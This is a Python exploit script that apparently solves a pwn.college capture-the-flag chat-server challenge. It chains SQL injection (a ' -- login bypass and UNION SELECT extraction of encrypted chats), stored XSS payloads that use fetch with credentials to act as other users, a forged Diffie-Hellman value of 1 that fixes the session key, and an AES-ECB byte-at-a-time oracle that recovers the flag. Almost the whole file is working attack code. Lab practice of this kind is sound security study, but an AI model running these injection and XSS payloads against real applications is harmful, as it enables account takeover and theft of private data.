import requests
import time
import urllib.parse
import math
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

chat_server_url = "http://10.0.0.1:80"

#------------------------------------------------------------------------------
# 
# 2048-bit MODP Group from RFC3526
DH_p = int.from_bytes(bytes.fromhex(
    "FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1 "
    "29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD "
    "EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245 "
    "E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED "
    "EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D "
    "C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F "
    "83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D "
    "670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B "
    "E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9 "
    "DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510 "
    "15728E5A 8AACAA68 FFFFFFFF FFFFFFFF"
), "big")
DH_g = 2

dh_A_fake = 1
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Messages
msg_to_alice_1 = "I heard someone shared the flag with Bob!"
msg_to_bob_1 = f"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: {dh_A_fake}."
msg_to_alice_2 = f"Hey Alice, sure: {dh_A_fake}." 
#msg_to_bob_2 = encrypt("Hey Bob, I know that someone shared the flag with you. Who was it?")
msg_to_bob_2 = "Hey Bob, I know that someone shared the flag with you. Who was it?"
msg_to_bob_3 = "Thanks Bob, I'll look into it."
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Methods
#method: "POST", credentials: "include", body: "message=' + urllib.parse.quote_plus(msg) + '"})\
def alice_msg(recipient, msg):
    #return urllib.parse.quote_plus('<script>\
    return '<script>\
fetch("http://127.0.0.1/chat/' + recipient + '", {headers:{"Content-Type": "application/x-www-form-urlencoded"}, \
method: "POST", credentials: "include", body: "message=' + msg + '"})\
.then(response => response.text()).then(response => console.log(response));\
</script>'

def register_user(username):
    #return urllib.parse.quote_plus('<script>\
    return '<script>\
fetch("http://127.0.0.1/register", {headers:{"Content-Type": "application/x-www-form-urlencoded"}, \
method: "POST", credentials: "include", body: "username=' + username + '&password=1"})\
.then(response => response.text()).then(response => console.log(response));\
</script>'

def modify_username(user, new_username):
    #return urllib.parse.quote_plus('<script>\
    return '<script>\
fetch("http://127.0.0.1/user/' + user + '/modify", {headers:{"Content-Type": "application/x-www-form-urlencoded"}, \
method: "POST", credentials: "include", body: "username=' + new_username + '&password=1"})\
.then(response => response.text()).then(response => console.log(response));\
</script>'

def get_enc_sharon_msg_from_db(dummy_enc):
    sqli_query = f"mallory' \
UNION SELECT encrypted_contents AS lala,0,0 FROM encrypted_chats \
WHERE (encrypted_username_1 IS NULL OR encrypted_username_2 IS NULL) \
AND COALESCE(encrypted_chats.encrypted_username_2,'') NOT LIKE '{dummy_enc}%' "
#WHERE encrypted_username_1 IS NULL \
#AND encrypted_username_2 NOT LIKE '{dummy_enc}%' "
    order = "ORDER BY lala ASC -- "
    session = requests.Session()
    response = session.post(f"{chat_server_url}/login", data={"username": sqli_query + order, "password": 'A'})
    print(response.text)

    if "mallory" in response.text.split("<br>")[0]:
        order = "ORDER BY lala DESC -- "
        response = session.post(f"{chat_server_url}/login", data={"username": sqli_query + order, "password": 'A'})
        if "mallory" in response.text.split("<br>")[0]:
            print("[ERROR] Not able to get sharon encrypted message")

    return response.text.split("<br>")[0].split(" ")[1][:-1]


def encrypt_msg(dummy_enc, msg, tmp_user):
    #msg = urllib.parse.quote_plus(msg)
    #tmp_user = urllib.parse.quote_plus(tmp_user)
    requests.post(f"{chat_server_url}/register", data={"username": tmp_user, "password": "A"})
    sqli_query = f"mallory' \
UNION SELECT encrypted_contents AS lala,0,0 FROM encrypted_chats \
WHERE (encrypted_username_1 IS NOT NULL AND encrypted_username_2 IS NOT NULL) \
AND (COALESCE(encrypted_chats.encrypted_username_2,'') LIKE '{dummy_enc}%' \
OR COALESCE(encrypted_chats.encrypted_username_1,'') LIKE '{dummy_enc}%') "

#WHERE encrypted_username_1 IS NOT NULL \
#AND encrypted_username_2 LIKE '{dummy_enc}%' "
    order = "ORDER BY lala ASC -- "
    #print(sqli_query + order)
    session = requests.session()
    session.post(f"{chat_server_url}/login", data={"username": tmp_user, "password": 'A'})
    session.post(f"{chat_server_url}/chat/bob: Wow, someone", data={"message": msg})
    response = session.post(f"{chat_server_url}/login", data={"username": sqli_query + order, "password": 'A'})
    print(response.text)
    if "mallory" in response.text.split("<br>")[0]:
        order = "ORDER BY lala DESC -- "
        sqli_query = f"mallory' UNION SELECT encrypted_contents as lala,0,0 FROM encrypted_chats WHERE encrypted_username_2 LIKE '{dummy_enc}%' AND encrypted_username_1 IS NOT NULL ORDER BY lala DESC -- "
        response = session.post(f"{chat_server_url}/login", data={"username": sqli_query + order, "password": 'A'})
        if "mallory" in response.text.split("<br>")[0]:
            print("[ERROR] Not able to encrypt message")
    enc_msg = response.text.split("<br>")[0].split(" ")[1][:-1]
    response = session.post(f"{chat_server_url}/login", data={"username": tmp_user, "password": 'A'})
    response = session.post(f"{chat_server_url}/user/{tmp_user}/modify", data={"delete": "Delete"})
    return enc_msg


def wait_a_little():
    time.sleep(6)

session = requests.Session()

# Create dummy user to receive (encrypt) messages
# -----------------------------------------------------------------------------
dummy_sqli_query = "mallory' UNION SELECT encrypted_contents AS lala,0,0 \
FROM encrypted_chats WHERE encrypted_username_1 IS NOT NULL "
order = "ORDER BY lala ASC -- "
session = requests.Session()
response = session.post(f"{chat_server_url}/login", data={"username": dummy_sqli_query + order, "password": 'A'})

if "mallory" in response.text.split("<br>")[0]:
    order = "ORDER BY lala DESC -- "
    response = session.post(f"{chat_server_url}/login", data={"username": dummy_sqli_query + order, "password": 'A'})

dummy_enc = response.text.split("<br>")[0].split(" ")[1][:30]
print(f"dummy_enc: {dummy_enc}")

# url encoided: bob:+Wow,+someon
requests.post(f"{chat_server_url}/register", data={"username": "bob: Wow, someone", "password": "A"})

# -----------------------------------------------------------------------------

print(get_enc_sharon_msg_from_db(dummy_enc))
print(encrypt_msg(dummy_enc, "TEST1", "1"))
print(encrypt_msg(dummy_enc, "TEST2", "2"))

input("LALALALALALALALALA")

login_sqli_query = "' -- "
user = "mallory" + login_sqli_query

response = session.post(f"{chat_server_url}/login", data={"username": user, "password": 'A'})
print(response.text.split("<br>")[0])

response = session.post(f"{chat_server_url}/chat/alice", data={"message": alice_msg("bob", msg_to_bob_1)})
response = session.post(f"{chat_server_url}/chat/alice", data={"message": msg_to_alice_1})

user = "bob" + login_sqli_query
response = session.post(f"{chat_server_url}/login", data={"username": user, "password": 'A'})
print(response.text.split("<br>")[0])

response = session.post(f"{chat_server_url}/chat/alice", data={"message": msg_to_alice_2})
DH_B = 0

while True:
    response = session.get(f"{chat_server_url}/chat/alice")
    #print(response.text.split("sure: ")[1].split(".")[0])
    if len(response.text.split("sure: ")) >= 2:
        DH_B = int(response.text.split("sure: ")[1].split(".")[0])
        print(f"[INFO] DH_B {DH_B}")
        break

if DH_B == 0:
    print("[ERROR] DH_B is zero")

# DH_B should be 1, so the second argument can be anything
dh_s = pow(DH_B, 1, DH_p)

key = dh_s.to_bytes(256, "big")[:16]
print(f"[INFP] key: {key}")
cipher_send = AES.new(key, AES.MODE_ECB)
cipher_recv = AES.new(key, AES.MODE_ECB)
encrypt = lambda data: cipher_send.encrypt(pad(data.encode(), cipher_send.block_size)).hex()
decrypt = lambda data: unpad(cipher_recv.decrypt(bytes.fromhex(data)), cipher_recv.block_size).decode()

user = "mallory" + login_sqli_query
response = session.post(f"{chat_server_url}/login", data={"username": user, "password": 'A'})
print(response.text.split("<br>")[0])

#print(alice_msg("bob", msg_to_bob_2))
response = session.post(f"{chat_server_url}/chat/alice", data={"message": alice_msg("bob", encrypt(msg_to_bob_2))})
#response = session.post(f"{chat_server_url}/chat/alice", data={"message": alice_msg("bob", encrypt(msg_to_bob_3))})

#response = session.get(f"{chat_server_url}/chat/alice")
#print(response.text)

time.sleep(8)
user = "bob" + login_sqli_query
response = session.post(f"{chat_server_url}/login", data={"username": user, "password": 'A'})

response = session.get(f"{chat_server_url}/chat/alice")
print(80*"-")
msg_enc = response.text.split("bob: ")[-1].split("<br>")[0][:-1]
print(msg_enc)
print(80*"-")
sharon_username = decrypt(msg_enc).split(" ")[3][1:-2]
print(sharon_username)

# ORACLE

#from string import ascii_letters, digits
#flag_chars = ascii_letters + digits + ".-_{}"

# sharon10792150105986577470: The flag is pwn.college{practice}.
msg_ini = sharon_username + ": The flag is pwn.college{"

padding_len = 15 - (len(msg_ini) % 16)
blk = math.floor(len(msg_ini)/16)
print(f"padding_len_ini: {padding_len}  |  blk_ini: {blk}")
print("A"*padding_len + msg_ini)

print(f"encrypted sharon message: {get_enc_sharon_msg_from_db(dummy_enc)}")

user = "mallory" + login_sqli_query
response = session.post(f"{chat_server_url}/login", data={"username": user, "password": 'A'})
print(response.text.split("<br>")[0])

response = session.post(f"{chat_server_url}/chat/alice", data={"message": modify_username("bob", sharon_username)})
cur_sharon_username = sharon_username
wait_a_little()

#print(f"First oracle message: {'A'*padding_len + sharon_username}")
#response = session.post(f"{chat_server_url}/chat/alice", data={"message": modify_username(sharon_username, "A"*padding_len + sharon_username)})
#cur_sharon_username = "A"*padding_len + sharon_username
#wait_a_little()

#true_enc = get_enc_sharon_msg_from_db(dummy_enc)
#print(f"true_enc: {true_enc}")
#print(f"true_enc blk: {true_enc[blk*32:(blk+1)*32]}")

while True:
    print(80*"-")
    #print("A"*padding_len + msg_ini + chr(idx))
    #new_sharon_username = "A"*padding_len + msg_ini + chr(idx)
    #print(f"cur_sharon_username: {cur_sharon_username}")
    #print(f"new_sharon_username: {new_sharon_username}")
    #print(f"length of new sharon username: {len(new_sharon_username)}")
    #response = session.post(f"{chat_server_url}/chat/alice", data={"message": modify_username(cur_sharon_username, new_sharon_username)})
    #cur_sharon_username = new_sharon_username
    #wait_a_little()

    new_sharon_username = "A" * padding_len + sharon_username
    print(f"New sharon username: {new_sharon_username}")
    response = session.post(f"{chat_server_url}/chat/alice", data={"message": modify_username(cur_sharon_username, new_sharon_username)})
    cur_sharon_username = new_sharon_username
    wait_a_little()

    true_enc = get_enc_sharon_msg_from_db(dummy_enc)
    print(f"true_enc blk: {true_enc[blk*32:(blk+1)*32]}")

    for idx in range(33, 127):
        # illegal chars:  # % & / ?
        if idx == 35 or idx == 37 or idx == 38 or idx == 47 or idx == 63:
            continue
        print(80*"-")
        #print("A"*padding_len + msg_ini + chr(idx))
        #new_sharon_username = "A"*padding_len + msg_ini + chr(idx)
        dummy_username = "A"*padding_len + msg_ini + chr(idx)
        #print(f"cur_sharon_username: {cur_sharon_username}")
        #print(f"new_sharon_username: {new_sharon_username}")
        print(f"dummy_username: {dummy_username}")
        #print(f"length of new sharon username: {len(new_sharon_username)}")
        print(f"length of dummy username: {len(dummy_username)}")
        #response = session.post(f"{chat_server_url}/chat/alice", data={"message": modify_username(cur_sharon_username, new_sharon_username)})
        #cur_sharon_username = new_sharon_username
        #wait_a_little()
        #try_enc = get_enc_msg_from_db()
        #print(f"try_enc: {try_enc}")
        try_enc = encrypt_msg(dummy_enc, "1", dummy_username)
        print(f"try_enc blk: {try_enc[blk*32:(blk+1)*32]}")
        if true_enc[blk*32:(blk+1)*32] == try_enc[blk*32:(blk+1)*32]:
            msg_ini += chr(idx)
            print(msg_ini)
            if padding_len == 0 :
                padding_len = 15
                blk += 1
            else:
                padding_len -= 1
            break

    #cipher_blk_test = p.readline().decode().split(" ")[1][blk:blk+32]

#user = "mallory" + login_sqli_query
#response = session.post(f"{chat_server_url}/login", data={"username": user, "password": 'A'})
#print(response.text[0:14])

#response = session.post(f"{chat_server_url}/chat/alice", data={"message": register_user(sharon_username)})
